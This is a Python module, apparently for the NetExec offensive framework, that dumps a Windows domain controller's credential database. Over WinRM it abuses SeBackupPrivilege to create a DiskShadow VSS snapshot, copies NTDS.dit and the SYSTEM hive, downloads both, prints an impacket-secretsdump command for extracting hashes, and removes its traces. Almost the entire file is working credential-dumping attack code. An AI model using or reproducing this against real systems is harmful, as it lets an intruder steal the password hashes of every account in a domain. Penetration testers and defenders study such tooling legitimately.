"""Dump NTDS.dit via a VSS snapshot created with DiskShadow.

Requires SeBackupPrivilege (typically a Domain Controller).
"""

import contextlib
import json
import os
import re
import shlex
import tempfile

from nxc.helpers.misc import CATEGORY, gen_random_string

# Regex constants - all DiskShadow output formats validated on Server 2019/2022

# DiskShadow verbose alias-binding line: "  -> %alias% = {GUID}"
# Leading whitespace is intentional; alias comparison is case-insensitive.
_ALIAS_LINE_RE = re.compile(
    r"^\s*->\s+%(?P<alias>[^%]+)%\s+=\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}",
    re.IGNORECASE | re.MULTILINE,
)

# Alternative verbose line (some Windows versions): alias resolved as env var.
# Confirmed on Blackfield lab, Server 2019; no leading "->"; "shadow ID" not "shadow copy".
_ALIAS_ENVVAR_RE = re.compile(
    r"^\s*Alias\s+(?P<alias>\S+)\s+for\s+shadow\s+ID\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}\s+set\s+as\s+environment\s+variable",
    re.IGNORECASE | re.MULTILINE,
)

# Exposure confirmation: trailing backslash-period required (DiskShadow can exit 0 without it).
_EXPOSE_CONFIRM_RE = re.compile(
    r"(?im)^[ \t]*the[ \t]+shadow[ \t]+copy[ \t]+was[ \t]+successfully[ \t]+exposed[ \t]+as[ \t]+([A-Za-z]):\\\.[ \t\r]*$"
)

# Cleanup transcript markers emitted by "delete shadows id {GUID}":
_CLEANUP_DELETING_RE = re.compile(
    r"deleting shadow copy \{([^}]+)\}\.\.\.", re.IGNORECASE
)
_CLEANUP_COUNT_RE = re.compile(r"1 shadow cop(?:y|ies) deleted", re.IGNORECASE)

_CRLF = "\r\n"


# Module-level helpers - DiskShadow-specific, testable without a live target


def parse_alias_guid(stdout: str, alias: str) -> str | None:
    """Return snapshot GUID bound to *alias* (uppercase), or ``None`` if absent.

    Recognises two formats:
      Format 1: ``  -> %alias% = {GUID}``
      Format 2: ``Alias alias for shadow ID {GUID} set as environment variable.``

    The same GUID in both formats counts as one match.
    Raises ``ValueError`` if more than one distinct GUID is bound to *alias*.
    """
    guids: set[str] = set()
    for pattern in (_ALIAS_LINE_RE, _ALIAS_ENVVAR_RE):
        for m in pattern.finditer(stdout):
            if m.group("alias").lower() == alias.lower():
                guids.add(m.group("guid").upper())
    if not guids:
        return None
    if len(guids) > 1:
        raise ValueError(
            f"Ambiguous: alias %{alias}% resolved to {len(guids)} distinct GUIDs"
        )
    return guids.pop()


def build_create_script(alias: str, drive_letter: str, metadata_path: str) -> str:
    """Return a CRLF-terminated DiskShadow create script for C:, exposed at *drive_letter*: with metadata at *metadata_path*."""
    lines = [
        "set verbose on",
        "set context persistent nowriters",
        f"set metadata {metadata_path}",
        f"add volume C: alias {alias}",
        "create",
        f"expose %{alias}% {drive_letter}:",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


def build_cleanup_script(drive_letter: str, shadow_guid: str) -> str:
    """Return a CRLF-terminated DiskShadow script that unexposes *drive_letter*: and deletes the snapshot by exact GUID."""
    lines = [
        "set verbose on",
        f"unexpose {drive_letter}:",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


def build_delete_only_script(shadow_guid: str) -> str:
    """Return a CRLF-terminated DiskShadow script that deletes the snapshot by exact GUID (no unexpose)."""
    lines = [
        "set verbose on",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


# NXCModule


class NXCModule:
    """Dump NTDS.dit via a VSS snapshot created with DiskShadow.

    Requires SeBackupPrivilege; cleanup always runs in a finally block.
    Snapshot deletion is always by exact GUID confirmed in DiskShadow output.
    """

    name = "ntds_shadow"
    description = "Dump NTDS.dit via a VSS snapshot (DiskShadow)"
    supported_protocols = ["winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No options."""

    # Native-command adapter

    def _run_cmd(self, connection, cmd: str) -> tuple[str, str, int]:
        """Execute a CMD command through PowerShell; return (stdout, stderr, rc).

        Backup Operators lack CMD Invoke rights so cmd.exe is launched via
        System.Diagnostics.Process; streams and exit code are captured as JSON.
        Raises RuntimeError on PS transport failure or JSON parsing errors.
        """
        safe = cmd.replace("'", "''")
        ps = (
            "$p=[System.Diagnostics.Process]::new();"
            "$p.StartInfo.FileName='cmd.exe';"
            f"$p.StartInfo.Arguments='/c {safe}';"
            "$p.StartInfo.UseShellExecute=$false;"
            "$p.StartInfo.RedirectStandardOutput=$true;"
            "$p.StartInfo.RedirectStandardError=$true;"
            "[void]$p.Start();"
            "$ot=$p.StandardOutput.ReadToEndAsync();"
            "$et=$p.StandardError.ReadToEndAsync();"
            "$p.WaitForExit();"
            "[pscustomobject]@{O=$ot.Result;E=$et.Result;C=[int]$p.ExitCode}|ConvertTo-Json -Compress"
        )
        try:
            ps_stdout, streams, had_errors = connection.conn.execute_ps(ps)
        except (TypeError, ValueError) as exc:
            raise RuntimeError(
                f"Unexpected execute_ps return shape for {cmd!r}: {exc}"
            ) from exc
        if had_errors:
            error_msgs = ""
            with contextlib.suppress(Exception):
                error_msgs = "; ".join(str(e) for e in (streams.error or []))
            raise RuntimeError(
                f"PowerShell adapter reported errors for {cmd!r}"
                + (f": {error_msgs}" if error_msgs else "")
            )
        if not ps_stdout:
            raise RuntimeError(f"No response from PowerShell adapter for: {cmd!r}")
        try:
            data = json.loads(ps_stdout)
            return str(data.get("O") or ""), str(data.get("E") or ""), int(data["C"])
        except (json.JSONDecodeError, KeyError, TypeError, ValueError) as exc:
            raise RuntimeError(
                f"Failed to parse adapter response for {cmd!r}: {exc}"
            ) from exc

    # Entry point

    def on_login(self, context, connection):
        log = context.log

        # 1. Privilege check
        if not self._check_privilege(log, connection):
            return

        # 2. Per-run identifiers
        run_id = gen_random_string(8).lower()
        alias = f"vss{run_id}"
        staging_dir = f"C:\\Windows\\Temp\\nxc_{run_id}"
        script_path = f"{staging_dir}\\create.dsh"
        metadata_path = f"{staging_dir}\\metadata.cab"
        ntds_dst = f"{staging_dir}\\ntds.dit"
        system_dst = f"{staging_dir}\\SYSTEM"

        # 3. Staging directory
        _, stderr, rc = self._run_cmd(connection, f"mkdir {staging_dir}")
        if rc != 0:
            log.fail(f"Failed to create staging directory: {stderr.strip()}")
            return

        # 4. Drive letter
        drive_letter = self._pick_drive(log, connection)
        if not drive_letter:
            with contextlib.suppress(Exception):
                self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
            return

        # 5. Upload DiskShadow create script
        if not self._upload(
            log,
            connection,
            build_create_script(alias, drive_letter, metadata_path),
            script_path,
        ):
            with contextlib.suppress(Exception):
                self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
            return

        # 6. Run DiskShadow; capture rc so a non-zero exit is diagnosed.
        log.display("Running DiskShadow to create VSS snapshot...")
        stdout, stderr, ds_create_rc = self._run_cmd(
            connection, f"diskshadow /s {script_path}"
        )

        # 7. Parse GUID regardless of rc so a partial run can be cleaned safely.
        try:
            shadow_guid = parse_alias_guid(stdout, alias)
        except ValueError as exc:
            log.fail(f"Can't determine snapshot GUID: {exc}")
            self._cleanup(log, connection, None, drive_letter, False, staging_dir)
            return

        if ds_create_rc != 0:
            log.fail(f"DiskShadow exited with code {ds_create_rc}; cleaning up")
            for line in stdout.splitlines():
                if line.strip():
                    log.display(f"  [stdout] {line}")
            for line in stderr.splitlines():
                if line.strip():
                    log.fail(f"  [stderr] {line}")
            if shadow_guid is None:
                log.fail(
                    "No alias-bound GUID in DiskShadow output - a snapshot may remain; verify manually"
                )
            self._cleanup(
                log, connection, shadow_guid, drive_letter, False, staging_dir
            )
            return

        if not shadow_guid:
            log.fail(
                "DiskShadow did not report a snapshot GUID - snapshot may not have been created"
            )
            self._cleanup(log, connection, None, drive_letter, False, staging_dir)
            return

        log.success(f"Snapshot created: {{{shadow_guid}}}")

        # Steps 8-12: the inner except logs acquisition errors before finally runs, so the
        # message is never lost even if _cleanup itself raises.  The outer except silences
        # whatever propagates (re-raised acquisition error or a cleanup exception that replaced
        # it) so nothing escapes into NetExec.  _cleanup is called exactly once by finally.
        expose_reported = False
        ntds_ok = False
        system_ok = False
        local_ntds = local_system = ""
        try:
            try:
                # 8. Verify exposure (rc=0 alone is insufficient; DiskShadow can exit clean without it).
                expose_matches = _EXPOSE_CONFIRM_RE.findall(stdout)
                if (
                    len(expose_matches) != 1
                    or expose_matches[0].upper() != drive_letter
                ):
                    log.fail(
                        f"DiskShadow did not confirm exposure on {drive_letter}: ({len(expose_matches)} confirmation lines found)"
                    )
                    return

                expose_reported = True
                log.success(f"Snapshot exposed at {drive_letter}:")

                # 9. Verify NTDS.dit is accessible through the exposed drive.
                _, _, ntds_rc = self._run_cmd(
                    connection, f'dir "{drive_letter}:\\Windows\\NTDS\\ntds.dit" /b'
                )
                if ntds_rc != 0:
                    log.fail(
                        f"NTDS.dit not accessible at {drive_letter}:\\Windows\\NTDS\\ntds.dit"
                    )
                    return

                # 10. Robocopy NTDS.dit (exit codes 0-7 are success variants)
                log.display("Copying NTDS.dit from snapshot...")
                _, _, rob_rc = self._run_cmd(
                    connection,
                    f"robocopy {drive_letter}:\\Windows\\NTDS {staging_dir} ntds.dit /b /r:2 /w:1 /j",
                )
                if rob_rc >= 8:
                    log.fail(f"robocopy NTDS.dit failed (exit code {rob_rc})")
                    return

                # 11. Save SYSTEM registry hive
                log.display("Saving SYSTEM registry hive...")
                _, _, reg_rc = self._run_cmd(
                    connection, f"reg save HKLM\\SYSTEM {system_dst} /y"
                )
                if reg_rc != 0:
                    log.fail("reg save SYSTEM failed")
                    return

                # 12. Download with remote-vs-local size verification (fail-closed)
                output_base = connection.output_file_template.format(
                    output_folder="ntds"
                )
                os.makedirs(os.path.dirname(output_base), exist_ok=True)
                local_ntds = f"{output_base}.ntds.dit"
                local_system = f"{output_base}.SYSTEM"
                ntds_ok = self._download(
                    log, connection, ntds_dst, local_ntds, "NTDS.dit"
                )
                system_ok = self._download(
                    log, connection, system_dst, local_system, "SYSTEM"
                )

            except Exception as exc:
                log.fail(f"Unexpected error during acquisition: {exc}")
                raise

            finally:
                self._cleanup(
                    log,
                    connection,
                    shadow_guid,
                    drive_letter,
                    expose_reported,
                    staging_dir,
                    ntds_path=ntds_dst,
                    system_path=system_dst,
                )

            # 13. Print offline analysis command
            if ntds_ok and system_ok:
                log.highlight(
                    f"Run: impacket-secretsdump -system {shlex.quote(local_system)} -ntds {shlex.quote(local_ntds)} LOCAL"
                )
            else:
                log.fail(
                    "One or more downloads failed - secretsdump command not printed"
                )

        except Exception:
            pass

    # Private helpers

    def _check_privilege(self, log, connection) -> bool:
        """Return True if SeBackupPrivilege is Enabled for the current user."""
        try:
            stdout, _, _ = self._run_cmd(connection, "whoami /priv /fo csv /nh")
        except Exception as exc:
            log.fail(f"Privilege check failed: {exc}")
            return False
        for line in stdout.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 3 and parts[0].upper() == "SEBACKUPPRIVILEGE":
                if parts[2].upper() == "ENABLED":
                    log.success("SeBackupPrivilege is Enabled")
                    return True
                log.fail("SeBackupPrivilege is present but not Enabled")
                return False
        log.fail("SeBackupPrivilege not found - aborting")
        return False

    def _pick_drive(self, log, connection) -> str | None:
        """Return the highest available drive letter from Z to D, or None."""
        output = (
            connection.execute(
                "[System.IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name }",
                True,
                shell_type="powershell",
            )
            or ""
        )
        occupied = {
            line.strip()[:2].upper() for line in output.splitlines() if line.strip()
        }
        for letter in "ZYXWVUTSRQPONMLKJIHGFED":
            if f"{letter}:" not in occupied:
                log.debug(f"Selected drive letter: {letter}:")
                return letter
        log.fail("No free drive letter available (Z-D all occupied)")
        return None

    def _upload(self, log, connection, content: str, remote_path: str) -> bool:
        """Write *content* to a local temp file and upload to *remote_path*; return True on success."""
        local_path = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".dsh", delete=False
            ) as tmp:
                tmp.write(content)
                local_path = tmp.name
            connection.conn.copy(local_path, remote_path)
            return True
        except Exception as exc:
            log.fail(f"Failed to upload script to {remote_path}: {exc}")
            return False
        finally:
            if local_path:
                with contextlib.suppress(FileNotFoundError, OSError):
                    os.unlink(local_path)

    def _download(
        self, log, connection, remote_path: str, local_path: str, label: str
    ) -> bool:
        """Fetch *remote_path* to *local_path*, verifying byte count; return False on any failure."""
        ps_out = connection.execute(
            f"(Get-Item '{remote_path}').Length", True, shell_type="powershell"
        )
        try:
            remote_size = int(ps_out.strip()) if ps_out else 0
        except ValueError:
            remote_size = 0
        if remote_size <= 0:
            log.fail(f"{label}: remote size unavailable or zero (got {ps_out!r})")
            return False

        try:
            connection.conn.fetch(remote_path, local_path)
        except Exception as exc:
            log.fail(f"Failed to download {label}: {exc}")
            with contextlib.suppress(FileNotFoundError, OSError):
                os.unlink(local_path)
            return False

        local_size = os.path.getsize(local_path) if os.path.exists(local_path) else -1
        if local_size != remote_size:
            log.fail(
                f"{label} size mismatch: remote={remote_size} B, local={local_size} B"
            )
            with contextlib.suppress(FileNotFoundError, OSError):
                os.unlink(local_path)
            return False

        log.success(f"Downloaded {label} ({local_size} B) -> {local_path}")
        return True

    def _cleanup(
        self,
        log,
        connection,
        shadow_guid: str | None,
        drive_letter: str,
        expose_reported: bool,
        staging_dir: str,
        *,
        ntds_path: str | None = None,
        system_path: str | None = None,
    ) -> None:
        """Remove all remote artifacts owned by this run.

        Each step runs independently. Snapshot deletion is GUID-gated:
        ``shadow_guid=None`` removes only the staging dir (no DiskShadow call).
        ``shadow_guid=str`` issues exact ``delete shadows id {GUID}``.
        """
        # Best-effort: delete individual acquired files first
        for artifact in [a for a in (ntds_path, system_path) if a]:
            with contextlib.suppress(Exception):
                self._run_cmd(connection, f"del /f /q {artifact}")

        # Snapshot deletion - requires a verified GUID
        if shadow_guid:
            script = (
                build_cleanup_script(drive_letter, shadow_guid)
                if expose_reported
                else build_delete_only_script(shadow_guid)
            )
            cleanup_path = f"{staging_dir}\\cleanup.dsh"
            if self._upload(log, connection, script, cleanup_path):
                try:
                    ds_stdout, _, ds_rc = self._run_cmd(
                        connection, f"diskshadow /s {cleanup_path}"
                    )
                    m = _CLEANUP_DELETING_RE.search(ds_stdout)
                    guid_confirmed = m and m.group(1).upper() == shadow_guid.upper()
                    count_confirmed = _CLEANUP_COUNT_RE.search(ds_stdout)
                    if ds_rc == 0 and guid_confirmed and count_confirmed:
                        log.debug("Snapshot deleted successfully")
                    else:
                        log.fail(
                            f"Snapshot {{{shadow_guid}}} may remain on the target; verify: delete shadows id {{{shadow_guid}}}"
                        )
                except Exception as exc:
                    log.fail(
                        f"Snapshot {{{shadow_guid}}} may remain on the target; DiskShadow cleanup raised: {exc}"
                    )

        # Best-effort: remove staging directory last; log the path on non-zero rc or exception.
        try:
            _, _, rm_rc = self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
            if rm_rc != 0:
                log.fail(f"Staging directory may remain on target: {staging_dir}")
        except Exception as exc:
            log.fail(f"Staging directory may remain on target: {staging_dir} ({exc})")
